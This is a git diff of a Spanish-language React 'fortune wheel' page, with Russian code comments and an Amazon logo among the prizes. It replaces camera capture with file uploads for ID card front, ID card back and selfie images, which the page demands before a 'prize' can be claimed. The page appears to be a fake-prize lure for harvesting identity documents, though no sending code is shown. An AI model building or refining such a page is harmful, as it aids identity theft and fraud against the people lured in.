@@ -51,39 +51,29 @@ function App() {
       setResult(segment);
     }, 6000)
   };
+  const handleFileChange = (e, type) => {
+    const file = e.target.files[0];
+    const imageUrl = URL.createObjectURL(file);
 
-  const capturePhoto = (type) => {
-    const options = {
-      // Тут можно настроить качество и другие параметры изображения
-      quality: 0.5,
-    };
-
-    navigator.camera.getPicture(
-      (imageData) => {
-        switch (type) {
-          case 'front':
-            setFront(imageData);
-            break;
-          case 'back':
-            setBack(imageData);
-            break;
-          case 'selfie':
-            setSelfie(imageData);
-            break;
-          default:
-            break;
-        }
-      },
-      (error) => console.error('Ошибка при съемке фотографии: ', error),
-      options
-    );
+    switch (type) {
+      case 'front':
+        setFront(imageUrl);
+        break;
+      case 'back':
+        setBack(imageUrl);
+        break;
+      case 'selfie':
+        setSelfie(imageUrl);
+        break;
+      default:
+        break;
+    }
   };
 
   return (
     <div className="App">
       <div className="container">
         <h1>Rueda de la fortuna</h1>
-        {/* 180 - середина 1, 202.5 - край 1 с 8, 157.7 - край 1 с 2 */}
         <div className="wheel" style={{ transform: `rotate(${rotation}deg)` }}>
           <img src="assets/spainFlag.png" alt="" className='icon' />
           <div className="one"><span><img src="assets/amazon.png" alt="" /></span></div>
@@ -99,13 +89,13 @@ function App() {
         <button onClick={spinWheel} style={result ? { backgroundColor: '#fbc50246', pointerEvents: 'none' } : {}}>Gira la Rueda</button>
         <p>Si algo salió mal, escribe al soporte.</p>
 
-        <div className="modal" style={result ? {transform: 'translate(-50%, -50%) scale(1)'} : {}}>
+        <div className="modal" style={result ? { transform: 'translate(-50%, -50%) scale(1)' } : {}}>
           <h2>¡Felicidades! Tu premio es <span>{result}</span></h2>
           <p>Para reclamar un premio debes ser mayor de 18 años, subir tus documentos y una selfie.</p>
 
           <div className="docLoad">
             <div className="front">
-              <input type="file" accept="image/*" capture="environment" onChange={() => capturePhoto('front')} />
+              <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 'front')} />
               {front ? (
                 <img src={front} alt='' />
               ) : (
@@ -114,7 +104,7 @@ function App() {
               <span>Antes ID CARD</span>
             </div>
             <div className="back">
-              <input type="file" accept="image/*" capture="environment" onChange={() => capturePhoto('back')} />
+              <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 'back')} />
               {back ? (
                 <img src={back} alt='' />
               ) : (
@@ -123,7 +113,7 @@ function App() {
               <span>Atrás ID CARD</span>
             </div>
             <div className="slefie">
-              <input type="file" accept="image/*" capture="user" onChange={() => capturePhoto('selfie')} />
+              <input type="file" accept="image/*" onChange={(e) => handleFileChange(e, 'selfie')} />
               {selfie ? (
                 <img src={selfie} alt='' />
               ) : (
